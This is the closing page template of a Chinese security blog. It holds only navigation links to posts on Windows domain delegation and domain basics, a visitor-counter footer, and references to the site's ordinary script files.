}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/5778d21f.html"><i class="fas fa-angle-left">&nbsp;</i><span>域渗透之委托</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/4e0f5702.html"><span>域的基础知识</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>